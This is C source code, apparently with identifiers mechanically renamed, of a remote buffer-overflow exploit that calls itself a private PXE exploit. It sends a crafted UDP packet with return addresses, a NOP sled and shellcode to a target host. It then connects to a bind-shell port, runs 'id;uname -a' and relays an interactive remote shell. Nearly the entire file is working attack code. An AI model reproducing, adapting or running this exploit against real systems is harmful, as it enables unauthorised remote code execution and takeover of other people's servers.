
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_4__ TYPE_2__ ;
typedef struct TYPE_3__ TYPE_1__ ;


typedef int tmp ;
struct TYPE_3__ {void* s_addr; } ;
struct sockaddr_in {char* sin_zero; void* sin_port; TYPE_1__ sin_addr; void* sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int dummy; } ;
typedef int sockstruct ;
typedef int fd_set ;
struct TYPE_4__ {long ret; } ;


 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int FUNC_2 (int *) ;
 void* VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 size_t FUNC_3 (char*) ;
 int FUNC_4 (char*,int) ;
 int FUNC_5 (int) ;
 int FUNC_6 (int,struct sockaddr*,int) ;
 int FUNC_7 (int ) ;
 void* FUNC_8 (char*) ;
 void* FUNC_9 (int) ;
 int FUNC_10 (char*,long*,int) ;
 int FUNC_11 (char*,int,int) ;
 int FUNC_12 (char*,...) ;
 int FUNC_13 (int,char*,int) ;
 int FUNC_14 (int,int *,int *,int *,int *) ;
 long VAR_4 ;
 int FUNC_15 (int) ;
 int FUNC_16 (void*,int ,int) ;
 int FUNC_17 (char*,char*,long*) ;
 TYPE_2__* VAR_5 ;
 int FUNC_18 (char*) ;
 int FUNC_19 (int,char*,int) ;

int FUNC_20(int VAR_6, char **VAR_7) {

    int VAR_8=0;
    struct sockaddr_in VAR_9;
    struct hostent *VAR_10;
    char VAR_11[10000];
    int VAR_12;
    fd_set VAR_13;
int VAR_14=4011,VAR_15=2003;
char *VAR_16=((void*)0);
long VAR_17=0,VAR_18,VAR_19,VAR_20;
FUNC_12("\nLimpidByte private remote pxe exploit by CrZ [crazy_einstein@yahoo.com]\n");
for(VAR_8=0;VAR_8<VAR_6;VAR_8++) {
if(VAR_7[VAR_8][1]=='h') VAR_16=VAR_7[VAR_8+1];
if(VAR_7[VAR_8][1]=='p') VAR_14=FUNC_3(VAR_7[VAR_8+1]);
if(VAR_7[VAR_8][1]=='t') VAR_17=VAR_5[FUNC_3(VAR_7[VAR_8+1])].ret;
                if(VAR_7[VAR_8][1]=='r') FUNC_17(VAR_7[VAR_8+1],"0x%x",&VAR_17);
}
if(!VAR_16 || VAR_17==0) FUNC_18(VAR_7[0]);

VAR_18=VAR_17+2;
VAR_19=VAR_17+3;
VAR_20=VAR_17;

    VAR_12=FUNC_16(VAR_0,VAR_1,17);
    VAR_9.sin_family=VAR_0;
    VAR_9.sin_addr.s_addr=FUNC_8(VAR_16);
    VAR_9.sin_port=FUNC_9(VAR_14);
    FUNC_12("\n[!] Connecting to %s:%d\n",VAR_16,VAR_14);

      if(FUNC_6(VAR_12,(struct sockaddr*)&VAR_9,sizeof(VAR_9))>-1) {
        FUNC_12("[+] Connected!\n",VAR_8);

FUNC_4(VAR_11,sizeof VAR_11);
FUNC_10(VAR_11,&VAR_18,4);
FUNC_10(VAR_11+4,&VAR_19,4);
FUNC_11(VAR_11+8,0x90,894-8);
FUNC_10(VAR_11+894,&VAR_4,sizeof VAR_4);
FUNC_10(VAR_11+1024,&VAR_20,4);
FUNC_12("[!] Using 0x%x return address!\n",VAR_17);
FUNC_12("[>] Sending shellcode!\n");
FUNC_19(VAR_12,VAR_11,1024 + 4);
      }

      FUNC_5(VAR_12);
FUNC_12("[*] Trying to connect to %s:%d port!!! Pray for success!\n",VAR_16,VAR_15);
FUNC_12("[*] Sleeping at 2 seconds...\n");
FUNC_15(2);

        VAR_12=FUNC_16(VAR_0,VAR_2,0);
FUNC_4(VAR_9.sin_zero,sizeof(VAR_9.sin_zero));
VAR_9.sin_family=VAR_0;
        VAR_9.sin_addr.s_addr=FUNC_8(VAR_16);
        VAR_9.sin_port=FUNC_9(VAR_15);
        if(FUNC_6(VAR_12,(struct sockaddr*)&VAR_9,sizeof(VAR_9))>-1) {
        FUNC_12("[!] Connected! Here comes the shell baby...x)\n\n");
        FUNC_19(VAR_12, "id;uname -a\n", 12);
        while (1) {
                FUNC_2(&VAR_13);
                FUNC_1(VAR_12,&VAR_13);
                FUNC_1(VAR_3,&VAR_13);
                FUNC_14(VAR_12 + 1, &VAR_13, ((void*)0), ((void*)0), ((void*)0));
       if (FUNC_0(VAR_12, &VAR_13)) {
                        VAR_8 = FUNC_13(VAR_12, VAR_11, sizeof(VAR_11) - 1);
                        if (VAR_8 <= 0) {
                                FUNC_12("[!] Connection closed.\n");
                                FUNC_5(VAR_12);
                                FUNC_7(0);
                        }
                        VAR_11[VAR_8] = 0;
                        FUNC_12("%s", VAR_11);
                }
                if (FUNC_0(VAR_3, &VAR_13)) {
                        VAR_8 = FUNC_13(VAR_3, VAR_11, sizeof(VAR_11) - 1);
                        if (VAR_8 > 0) {
                                VAR_11[VAR_8]=0;
                                FUNC_19(VAR_12, VAR_11, VAR_8);
                        }
                }
        }
        } else FUNC_12("[x] Bad luck x(\n\n");
        FUNC_5(VAR_12);


    return 0;
}
